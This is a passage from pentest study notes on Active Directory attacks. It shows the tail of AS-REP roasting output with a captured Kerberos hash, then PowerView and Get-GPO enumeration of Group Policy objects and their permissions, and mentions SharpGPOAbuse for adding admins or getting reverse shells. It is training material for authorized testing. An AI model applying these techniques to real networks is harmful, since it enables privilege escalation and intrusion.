<a href="#__codelineno-12-5" id="__codelineno-12-5" name="__codelineno-12-5"></a>[-] User jjones@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-6" id="__codelineno-12-6" name="__codelineno-12-6"></a>[-] User tjohnson@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-7" id="__codelineno-12-7" name="__codelineno-12-7"></a>[-] User jwilson@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-8" id="__codelineno-12-8" name="__codelineno-12-8"></a>[-] User bdavis@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-9" id="__codelineno-12-9" name="__codelineno-12-9"></a>[-] User njohnson@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-10" id="__codelineno-12-10" name="__codelineno-12-10"></a>[-] User asanchez@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-11" id="__codelineno-12-11" name="__codelineno-12-11"></a>[-] User dlewis@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-12" id="__codelineno-12-12" name="__codelineno-12-12"></a>[-] User ccruz@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-13" id="__codelineno-12-13" name="__codelineno-12-13"></a>$krb5asrep$23$mmorgan@legalcorp.local@legalcorp.local:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
<a href="#__codelineno-12-14" id="__codelineno-12-14" name="__codelineno-12-14"></a>[-] User rramirez@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-15" id="__codelineno-12-15" name="__codelineno-12-15"></a>[-] User jwallace@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-16" id="__codelineno-12-16" name="__codelineno-12-16"></a>[-] User jsantiago@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
<a href="#__codelineno-12-17" id="__codelineno-12-17" name="__codelineno-12-17"></a>
<a href="#__codelineno-12-18" id="__codelineno-12-18" name="__codelineno-12-18"></a>&lt;SNIP&gt;
</code></pre></div> <hr/> <h2>Group Policy Object (GPO) Abuse</h2> <p>GPO misconfigurations can be abused to perform the following attacks:</p> <ul> <li>Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)</li> <li>Adding a local admin user to one or more hosts</li> <li>Creating an immediate scheduled task to perform any number of actions</li> </ul> <p>Using the <a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO" rel="noopener nofollow" target="_blank">Get-DomainGPO</a> function from PowerView, we can get a listing of GPOs by name.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a>PS C:\xyz&gt; Get-DomainGPO |select displayname
<a href="#__codelineno-13-2" id="__codelineno-13-2" name="__codelineno-13-2"></a>
<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a>displayname
<a href="#__codelineno-13-4" id="__codelineno-13-4" name="__codelineno-13-4"></a>-----------
<a href="#__codelineno-13-5" id="__codelineno-13-5" name="__codelineno-13-5"></a>Default Domain Policy
<a href="#__codelineno-13-6" id="__codelineno-13-6" name="__codelineno-13-6"></a>Default Domain Controllers Policy
<a href="#__codelineno-13-7" id="__codelineno-13-7" name="__codelineno-13-7"></a>Deny Control Panel Access
<a href="#__codelineno-13-8" id="__codelineno-13-8" name="__codelineno-13-8"></a>Disallow LM Hash
<a href="#__codelineno-13-9" id="__codelineno-13-9" name="__codelineno-13-9"></a>Deny CMD Access
<a href="#__codelineno-13-10" id="__codelineno-13-10" name="__codelineno-13-10"></a>Disable Forced Restarts
<a href="#__codelineno-13-11" id="__codelineno-13-11" name="__codelineno-13-11"></a>Block Removable Media
<a href="#__codelineno-13-12" id="__codelineno-13-12" name="__codelineno-13-12"></a>Disable Guest Account
<a href="#__codelineno-13-13" id="__codelineno-13-13" name="__codelineno-13-13"></a>Service Accounts Password Policy
<a href="#__codelineno-13-14" id="__codelineno-13-14" name="__codelineno-13-14"></a>Logon Banner
<a href="#__codelineno-13-15" id="__codelineno-13-15" name="__codelineno-13-15"></a>Disconnect Idle RDP
<a href="#__codelineno-13-16" id="__codelineno-13-16" name="__codelineno-13-16"></a>Disable NetBIOS
<a href="#__codelineno-13-17" id="__codelineno-13-17" name="__codelineno-13-17"></a>AutoLogon
<a href="#__codelineno-13-18" id="__codelineno-13-18" name="__codelineno-13-18"></a>GuardAutoLogon
<a href="#__codelineno-13-19" id="__codelineno-13-19" name="__codelineno-13-19"></a>Certificate Services
</code></pre></div> <p>If Group Policy Management Tools are installed on the host we are working from, we can use various built-in <a href="https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps" rel="noopener nofollow" target="_blank">GroupPolicy cmdlets</a> such as <code>Get-GPO</code> to perform the same enumeration.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-14-1" id="__codelineno-14-1" name="__codelineno-14-1"></a>PS C:\xyz&gt; Get-GPO -All | Select DisplayName
<a href="#__codelineno-14-2" id="__codelineno-14-2" name="__codelineno-14-2"></a>
<a href="#__codelineno-14-3" id="__codelineno-14-3" name="__codelineno-14-3"></a>DisplayName
<a href="#__codelineno-14-4" id="__codelineno-14-4" name="__codelineno-14-4"></a>-----------
<a href="#__codelineno-14-5" id="__codelineno-14-5" name="__codelineno-14-5"></a>Certificate Services
<a href="#__codelineno-14-6" id="__codelineno-14-6" name="__codelineno-14-6"></a>Default Domain Policy
<a href="#__codelineno-14-7" id="__codelineno-14-7" name="__codelineno-14-7"></a>Disable NetBIOS
<a href="#__codelineno-14-8" id="__codelineno-14-8" name="__codelineno-14-8"></a>Disable Guest Account
<a href="#__codelineno-14-9" id="__codelineno-14-9" name="__codelineno-14-9"></a>AutoLogon
<a href="#__codelineno-14-10" id="__codelineno-14-10" name="__codelineno-14-10"></a>Default Domain Controllers Policy
<a href="#__codelineno-14-11" id="__codelineno-14-11" name="__codelineno-14-11"></a>Disconnect Idle RDP
<a href="#__codelineno-14-12" id="__codelineno-14-12" name="__codelineno-14-12"></a>Disallow LM Hash
<a href="#__codelineno-14-13" id="__codelineno-14-13" name="__codelineno-14-13"></a>Deny CMD Access
<a href="#__codelineno-14-14" id="__codelineno-14-14" name="__codelineno-14-14"></a>Block Removable Media
<a href="#__codelineno-14-15" id="__codelineno-14-15" name="__codelineno-14-15"></a>GuardAutoLogon
<a href="#__codelineno-14-16" id="__codelineno-14-16" name="__codelineno-14-16"></a>Service Accounts Password Policy
<a href="#__codelineno-14-17" id="__codelineno-14-17" name="__codelineno-14-17"></a>Logon Banner
<a href="#__codelineno-14-18" id="__codelineno-14-18" name="__codelineno-14-18"></a>Disable Forced Restarts
<a href="#__codelineno-14-19" id="__codelineno-14-19" name="__codelineno-14-19"></a>Deny Control Panel Access
</code></pre></div> <p>Enumerating Domain User GPO Rights <div class="highlight"><pre><span></span><code><a href="#__codelineno-15-1" id="__codelineno-15-1" name="__codelineno-15-1"></a>PS C:\xyz&gt; $sid=Convert-NameToSid "Domain Users"
<a href="#__codelineno-15-2" id="__codelineno-15-2" name="__codelineno-15-2"></a>PS C:\xyz&gt; Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
<a href="#__codelineno-15-3" id="__codelineno-15-3" name="__codelineno-15-3"></a>
<a href="#__codelineno-15-4" id="__codelineno-15-4" name="__codelineno-15-4"></a>ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=LEGALCORP,DC=LOCAL
<a href="#__codelineno-15-5" id="__codelineno-15-5" name="__codelineno-15-5"></a>ObjectSID             :
<a href="#__codelineno-15-6" id="__codelineno-15-6" name="__codelineno-15-6"></a>ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
<a href="#__codelineno-15-7" id="__codelineno-15-7" name="__codelineno-15-7"></a>                        WriteOwner
<a href="#__codelineno-15-8" id="__codelineno-15-8" name="__codelineno-15-8"></a>BinaryLength          : 36
<a href="#__codelineno-15-9" id="__codelineno-15-9" name="__codelineno-15-9"></a>AceQualifier          : AccessAllowed
<a href="#__codelineno-15-10" id="__codelineno-15-10" name="__codelineno-15-10"></a>IsCallback            : False
<a href="#__codelineno-15-11" id="__codelineno-15-11" name="__codelineno-15-11"></a>OpaqueLength          : 0
<a href="#__codelineno-15-12" id="__codelineno-15-12" name="__codelineno-15-12"></a>AccessMask            : 983095
<a href="#__codelineno-15-13" id="__codelineno-15-13" name="__codelineno-15-13"></a>SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
<a href="#__codelineno-15-14" id="__codelineno-15-14" name="__codelineno-15-14"></a>AceType               : AccessAllowed
<a href="#__codelineno-15-15" id="__codelineno-15-15" name="__codelineno-15-15"></a>AceFlags              : ObjectInherit, ContainerInherit
<a href="#__codelineno-15-16" id="__codelineno-15-16" name="__codelineno-15-16"></a>IsInherited           : False
<a href="#__codelineno-15-17" id="__codelineno-15-17" name="__codelineno-15-17"></a>InheritanceFlags      : ContainerInherit, ObjectInherit
<a href="#__codelineno-15-18" id="__codelineno-15-18" name="__codelineno-15-18"></a>PropagationFlags      : None
<a href="#__codelineno-15-19" id="__codelineno-15-19" name="__codelineno-15-19"></a>AuditFlags            : None
</code></pre></div></p> <p>Here we can see that the Domain Users group has various permissions over a GPO, such as <code>WriteProperty</code> and <code>WriteDacl</code>, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with <code>Get-GPO</code> to see the display name of the GPO.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-16-1" id="__codelineno-16-1" name="__codelineno-16-1"></a>PS C:\xyz Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
<a href="#__codelineno-16-2" id="__codelineno-16-2" name="__codelineno-16-2"></a>
<a href="#__codelineno-16-3" id="__codelineno-16-3" name="__codelineno-16-3"></a>DisplayName      : Disconnect Idle RDP
<a href="#__codelineno-16-4" id="__codelineno-16-4" name="__codelineno-16-4"></a>DomainName       : legalcorp.local
<a href="#__codelineno-16-5" id="__codelineno-16-5" name="__codelineno-16-5"></a>Owner            : LEGALCORP\Domain Admins
<a href="#__codelineno-16-6" id="__codelineno-16-6" name="__codelineno-16-6"></a>Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
<a href="#__codelineno-16-7" id="__codelineno-16-7" name="__codelineno-16-7"></a>GpoStatus        : AllSettingsEnabled
<a href="#__codelineno-16-8" id="__codelineno-16-8" name="__codelineno-16-8"></a>Description      :
<a href="#__codelineno-16-9" id="__codelineno-16-9" name="__codelineno-16-9"></a>CreationTime     : 10/28/2021 3:34:07 PM
<a href="#__codelineno-16-10" id="__codelineno-16-10" name="__codelineno-16-10"></a>ModificationTime : 4/5/2022 6:54:25 PM
<a href="#__codelineno-16-11" id="__codelineno-16-11" name="__codelineno-16-11"></a>UserVersion      : AD Version: 0, SysVol Version: 0
<a href="#__codelineno-16-12" id="__codelineno-16-12" name="__codelineno-16-12"></a>ComputerVersion  : AD Version: 0, SysVol Version: 0
<a href="#__codelineno-16-13" id="__codelineno-16-13" name="__codelineno-16-13"></a>WmiFilter        :
</code></pre></div> <p>Checking in BloodHound, we can see that the <code>Domain Users</code> group has several rights over the <code>Disconnect Idle RDP</code> GPO, which could be leveraged for full control of the object.</p> <p><a class="glightbox" href="https://academy.hackthebox.com/storage/modules/143/gporights.png"><img alt="alt" src="https://academy.hackthebox.com/storage/modules/143/gporights.png"/></a></p> <p>If we select the GPO in BloodHound and scroll down to <code>Affected Objects</code> on the <code>Node Info</code> tab, we can see that this GPO is applied to one OU, which contains four computer objects.</p> <p><a class="glightbox" href="https://academy.hackthebox.com/storage/modules/143/gpoaffected.png"><img alt="alt" src="https://academy.hackthebox.com/storage/modules/143/gpoaffected.png"/></a></p> <p>We could use a tool such as <a href="https://github.com/FSecureLABS/SharpGPOAbuse" rel="noopener nofollow" target="_blank">SharpGPOAbuse</a> to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.</p> </article> </div> <script>var input,hash=location.hash.slice(1);hash.startsWith("__tabbed_")&&((input=document.getElementById(hash)).checked=!0)</script> </div> <a class="md-top md-icon" data-md-component="top" hidden="" href="#"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"></path></svg> Back to top </a> </main> <footer class="md-footer"> <nav aria-label="Footer" class="md-footer__inner md-grid"> <a aria-label="Previous: Vulnerabilities" class="md-footer__link md-footer__link--prev" href="../bleeding_edge_vulns/" rel="prev"> <div class="md-footer__button md-icon"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg> </div> <div class="md-footer__title"> <div class="md-ellipsis"> <span class="md-footer__direction"> Previous </span> Vulnerabilities </div> </div> </a> <a aria-label="Next: Domain Trusts Primer" class="md-footer__link md-footer__link--next" href="../../why_so_trusting/domain_trusts_primer/" rel="next"> <div class="md-footer__title"> <div class="md-ellipsis"> <span class="md-footer__direction"> Next </span> Domain Trusts Primer </div> </div> <div class="md-footer__button md-icon"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"></path></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class="md-copyright"> <div class="md-copyright__highlight"> Copyright © 2021 - 2022 neutronsec </div> </div> <div class="md-social"> <a class="md-social__link" href="https://github.com/neutronsec" rel="noopener" target="_blank" title="github.com"> <svg viewbox="0 0 496 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg> </a> <a class="md-social__link" href="https://twitter.com/neutronctf" rel="noopener" target="_blank" title="twitter.com"> <svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg> </a> <a class="md-social__link" href="https://secops.cc" rel="noopener" target="_blank" title="secops.cc"> <svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg> </a> <a class="md-social__link" href="mailto:hello@neutronsec.com" rel="noopener" target="_blank" title=""> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 4H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2m-3 13H7v-2h10m0-2H7v-2h10m3-2h-3V6h3"></path></svg> </a> </div> </div> </div> </footer> </div> <div class="md-dialog" data-md-component="dialog"> <div class="md-dialog__inner md-typeset"></div> </div> <script id="__config" type="application/json">{"base": "../../..", "features": ["announce.dismiss", "content.code.annotate", "content.tooltips", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src="../../../assets/javascripts/bundle.d36b1844.min.js"></script> <script>const lightbox = GLightbox({"touchNavigation": true, "loop": false, "width": "100%", "height": "auto", "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom"});</script></body> </html>